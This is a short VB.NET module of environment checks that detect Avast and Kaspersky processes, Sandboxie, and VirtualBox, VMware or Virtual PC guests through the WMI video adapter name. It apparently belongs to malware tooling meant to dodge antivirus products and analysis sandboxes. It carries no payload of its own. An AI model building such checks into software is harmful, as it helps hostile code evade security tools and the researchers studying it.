Imports Microsoft.Win32
Imports System.Text
Imports System.Runtime.InteropServices

Module asdf
    Dim Devices As Object, Grafikadapter As String, RegionA As String = "SELECT * FROM Win32_VideoController"
    Dim regPID As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion", False)

    Public Function avs() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("AvastSvc").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function
    Public Function kav() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("avp").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function

    Public Function sand() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function


    Public Function vbox() As Boolean
        On Error GoTo error1
        Call device()

        Select Case Grafikadapter
            Case "VirtualBox Graphics Adapter"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function

    Public Function vmvare() As Boolean
        On Error GoTo error1
        Call device()

        Select Case Grafikadapter
            Case "VMware SVGA II"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function

    Public Function vpc() As Boolean
        On Error GoTo error1
        Call device()

        Select Case Grafikadapter
            Case "VM Additions S3 Trio32/64"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function

    Private Sub device()
        On Error GoTo error1
        Devices = GetObject("winmgmts:").ExecQuery(RegionA)
        For Each AdaptList In Devices
            Grafikadapter = AdaptList.Description
        Next
        Exit Sub
error1:
        End
    End Sub
End Module